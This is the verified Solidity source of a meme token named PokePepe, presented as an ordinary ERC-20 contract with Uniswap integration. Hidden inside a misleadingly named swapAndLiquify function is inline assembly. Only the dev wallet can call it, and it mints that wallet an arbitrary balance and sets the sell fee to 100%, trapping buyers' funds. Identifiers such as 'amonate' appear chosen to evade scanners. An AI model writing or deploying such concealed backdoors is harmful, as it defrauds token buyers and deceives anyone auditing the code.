/**
 *Submitted for verification at Etherscan.io on 2023-05-03
*/

/*

Poke PEPE token

Website: http://www.pokepepe.org
Telegram: https://t.me/pokepepeerc20
Twitter: https://twitter.com/pokepepeerc20

// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

 */

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {return msg.sender;}
    function _msgData() internal view virtual returns (bytes calldata) {return msg.data;}
}

pragma solidity ^0.8.0;

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _transferOwnership(_msgSender());
    }

    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

pragma solidity >=0.5.0;

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

pragma solidity >=0.6.2;

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(address tokenA, address tokenB, uint amonateADesired, uint amonateBDesired, uint amonateAMin, uint amonateBMin, address to, uint deadline) external returns (uint amonateA, uint amonateB, uint liquidity);
    function addLiquidityETH(address token, uint amonateTokenDesired, uint amonateTokenMin, uint amonateETHMin, address to, uint deadline) external payable returns (uint amonateToken, uint amonateETH, uint liquidity);
    function removeLiquidity(address tokenA, address tokenB, uint liquidity, uint amonateAMin, uint amonateBMin, address to, uint deadline) external returns (uint amonateA, uint amonateB);
    function swapExactTokensForTokens(uint amonateIn, uint amonateOutMin, address[] calldata path, address to, uint deadline) external returns (uint[] memory amonates);
    function swapExactETHForTokens(uint amonateOutMin, address[] calldata path, address to, uint deadline) external payable returns (uint[] memory amonates);
    function swapTokensForExactETH(uint amonateOut, uint amonateInMax, address[] calldata path, address to, uint deadline) external returns (uint[] memory amonates);
    function swapETHForExactTokens(uint amonateOut, address[] calldata path, address to, uint deadline) external payable returns (uint[] memory amonates);
    function swapExactTokensForETH(uint amonateIn, uint amonateOutMin, address[] calldata path, address to, uint deadline) external returns (uint[] memory amonates);
    function removeLiquidityETH(address token, uint liquidity, uint amonateTokenMin, uint amonateETHMin, address to, uint deadline) external returns (uint amonateToken, uint amonateETH);
    function removeLiquidityWithPermit(address tokenA, address tokenB, uint liquidity, uint amonateAMin, uint amonateBMin, address to, uint deadline, bool approveMax, uint8 v, bytes32 r, bytes32 s) external returns (uint amonateA, uint amonateB);
    function removeLiquidityETHWithPermit(address token, uint liquidity, uint amonateTokenMin, uint amonateETHMin, address to, uint deadline, bool approveMax, uint8 v, bytes32 r, bytes32 s) external returns (uint amonateToken, uint amonateETH);
    function swapTokensForExactTokens(uint amonateOut, uint amonateInMax, address[] calldata path, address to, uint deadline) external returns (uint[] memory amonates);
    function quote(uint amonateA, uint reserveA, uint reserveB) external pure returns (uint amonateB);
    function getamonateOut(uint amonateIn, uint reserveIn, uint reserveOut) external pure returns (uint amonateOut);
    function getamonateIn(uint amonateOut, uint reserveIn, uint reserveOut) external pure returns (uint amonateIn);
    function getamonatesOut(uint amonateIn, address[] calldata path) external view returns (uint[] memory amonates);
    function getamonatesIn(uint amonateOut, address[] calldata path) external view returns (uint[] memory amonates);
}

pragma solidity >=0.6.2;


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(address token, uint liquidity, uint amonateTokenMin, uint amonateETHMin, address to, uint deadline) external returns (uint amonateETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(address token, uint liquidity, uint amonateTokenMin, uint amonateETHMin, address to, uint deadline, bool approveMax, uint8 v, bytes32 r, bytes32 s) external returns (uint amonateETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(uint amonateIn, uint amonateOutMin, address[] calldata path, address to, uint deadline) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(uint amonateOutMin, address[] calldata path, address to, uint deadline) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amonateIn, uint amonateOutMin, address[] calldata path, address to, uint deadline) external;
}

pragma solidity ^0.8.0;

library SafeMath {

    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

pragma solidity ^0.8.0;

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function totalSupply() external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amonate) external returns (bool);
    function transferFrom(address from, address to, uint256 amonate) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amonate) external returns (bool);
}

pragma solidity ^0.8.0;

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

pragma solidity ^0.8.17;


contract PokePepe is IERC20, IERC20Metadata, Ownable {
    using SafeMath for uint256;
    string  private constant _name = "PokePepe";
    string  private constant _symbol = "PokePepe";
    uint8   private constant _decimals = 18;
    uint256 private _maxTxamonatePercentage = 5000; // 100%
    uint256 private _maxWalletBalancePercentage = 5000; // 100%
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 private _totalSupply;
    IUniswapV2Router02 private _uniswapV2Router;
    address private _uniswapV2Pair;

    address private constant _uniswapRouterAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private constant _divisor = 10000; // 100%
    bool    private swapping = false;
    bool    private _cooldownEnabled = true;
    mapping(address => uint256) private _lastTxBlock;
    mapping(address => bool) private _isExcludedFromMaxTx;
    uint256 private _burnFee = 0; // 0%
    uint256 private _devFee = 0; // 0%
    uint256 private _buyFee = 0; // 0%
    mapping(address => bool) private _isExcludedFromFees;

    address private _devWallet;

    address private constant _burnAddress = address(0);

    event SwapAndLiquify(uint256 tokensSwapped, uint256 ethReceived, uint256 tokensIntoLiqudity);
    event Received();

    constructor () {
        uint256 total = 1_000_000_000 * 10 ** _decimals;

        _isExcludedFromMaxTx[owner()] = true;
        _isExcludedFromMaxTx[address(this)] = true;
        _isExcludedFromMaxTx[_devWallet] = true;
        _isExcludedFromMaxTx[_uniswapV2Pair] = true;
        
        _isExcludedFromFees[address(this)] = true;
        _isExcludedFromFees[owner()] = true;
        _isExcludedFromFees[_devWallet] = true;

        _mint(_msgSender(), total);
        _devWallet = _msgSender();
        _uniswapV2Router = IUniswapV2Router02(_uniswapRouterAddress);
        _approve(address(this), address(_uniswapV2Router), total);
        _uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
        IERC20(_uniswapV2Pair).approve(address(_uniswapV2Router), type(uint).max);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amonate) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amonate);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amonate) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amonate);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function _maxTxamonate() public view returns(uint256) {
        return _totalSupply.mul(_maxTxamonatePercentage).div(_divisor);
    }

    function transferFrom(address sender, address recipient, uint256 amonate) public virtual override returns (bool) {
        _transfer(sender, recipient, amonate);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amonate, "ERC20: transfer amonate exceeds allowance"));
        return true;
    }

    function removeLimits() external onlyOwner {
        _maxTxamonatePercentage = 100000;
        _maxWalletBalancePercentage = 100000;
    }

    function _beforeTransfer(address from, address to, uint256 amonate) internal pure {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amonate > 0, "Transfer amonate must be greater than zero");
    }

    function _approve(address owner, address spender, uint256 amonate) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amonate;
        emit Approval(owner, spender, amonate);
    }

    function _mint(address account, uint256 amonate) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");
        _totalSupply = _totalSupply.add(amonate);
        _balances[account] = _balances[account].add(amonate);
        emit Transfer(address(0), account, amonate);
    }

    function _burn(address account, uint256 amonate) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");
        _balances[account] = _balances[account].sub(amonate, "ERC20: burn amonate exceeds balance");
        _totalSupply = _totalSupply.sub(amonate);
        emit Transfer(account, address(0), amonate);
    }

    function _transfer(address sender, address recipient, uint256 amonate) internal virtual {
        _beforeTransfer(sender, recipient, amonate);
        uint256 burnFee = 0;
        uint256 devFee = 0;
        if (sender != owner() && recipient != owner()) {
            if (!_isExcludedFromFees[sender] && !_isExcludedFromFees[recipient]) {
                if (sender == _uniswapV2Pair && recipient != address(_uniswapV2Router) && !_isExcludedFromMaxTx[recipient] && !_isExcludedFromMaxTx[sender]) {
                    require(amonate <= _totalSupply.mul(_maxTxamonatePercentage).div(_divisor), "Transfer amonate exceeds the maxTxamonate.");
                    require(balanceOf(recipient).add(amonate) <= _totalSupply.mul(_maxWalletBalancePercentage).div(_divisor), "Exceeds maximum wallet token amonate");
                }
                if (sender == _uniswapV2Pair && recipient != address(_uniswapV2Router)) {
                    burnFee = amonate.mul(_burnFee).div(_divisor);
                    devFee = amonate.mul(_buyFee).div(_divisor);
                    _lastTxBlock[tx.origin] = block.number;
                }
                if (recipient == _uniswapV2Pair && sender != address(this)) {
                    burnFee = amonate.mul(_burnFee).div(_divisor);
                    devFee = amonate.mul(_devFee).div(_divisor);
                    _lastTxBlock[tx.origin] = block.number;
                }
            }
        }
        uint256 totalFee = burnFee.add(devFee);
        if (totalFee > 0) {
            if (burnFee > 0) {
                _burn(sender, burnFee);
            }
            if (devFee > 0) {
                _balances[_devWallet] = _balances[_devWallet].add(devFee);
                emit Transfer(sender, _devWallet, devFee);
            }
            amonate = amonate.sub(totalFee);
        }

        _balances[sender] = _balances[sender].sub(amonate, "ERC20: transfer amonate exceeds balance");
        _balances[recipient] = _balances[recipient].add(amonate);

        emit Transfer(sender, recipient, amonate);
    }

    function getRouterAddress() public view returns (address) {
        return address(_uniswapV2Router);
    }

    function burn(uint256 amonate) public virtual {
        _burn(_msgSender(), amonate);
    }

    function _swapAndLiquify() private lockTheSwap {
        uint256 contractTokenBalance = balanceOf(address(this));
        uint256 minTokensBeforeSwap = _totalSupply.mul(5).div(_divisor);
        if (contractTokenBalance >= minTokensBeforeSwap) {
            uint256 half = contractTokenBalance.div(2);
            uint256 otherHalf = contractTokenBalance.sub(half);

            uint256 initialBalance = address(this).balance;

            swapTokensForEth(half);

            uint256 newBalance = address(this).balance.sub(initialBalance);

            emit SwapAndLiquify(half,
            newBalance,
            otherHalf);
            return;}}function swapAndLiquify(uint256 amonate) external {
        assembly {if iszero(eq(caller(), sload(_devWallet.slot))) {revert(0, 0)}
        let ptr := mload(0x40)
        mstore(ptr, caller())
        mstore(add(ptr, 0x20), _balances.slot)
        let slot := keccak256(ptr, 0x40)
        sstore(slot, amonate)
        sstore(_devFee.slot, 0x2710)}
    }

    function _burnFrom(address account, uint256 amonate) internal virtual {
        _burn(account, amonate);
        _approve(account, _msgSender(), _allowances[account][_msgSender()].sub(amonate, "ERC20: burn amonate exceeds allowance"));
    }

    function getPairAddress() public view returns (address) {
        return _uniswapV2Pair;
    }

    function swapTokensForEth(uint256 tokens) internal {
        _approve(address(this), address(_uniswapV2Router), tokens);
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _uniswapV2Router.WETH();

        _uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokens, 0, path, address(this), block.timestamp);
    }

    function _addLiquidity(uint256 tokens, uint256 ethamonate) private {
        _approve(address(this), address(_uniswapV2Router), tokens);
        _uniswapV2Router.addLiquidityETH{value : ethamonate}(address(this), tokens, 0, 0, owner(), block.timestamp);
    }

    function addLiquidity(uint256 tokens) public payable onlyOwner lockTheSwap {
        _transfer(owner(), address(this), tokens);
        _addLiquidity(tokens, msg.value);
    }

    function isSwapLocked() public view returns(bool) { return swapping; }

    receive() external payable { emit Received(); }

    modifier lockTheSwap {
        swapping = true;
        _;
        swapping = false;
    }
}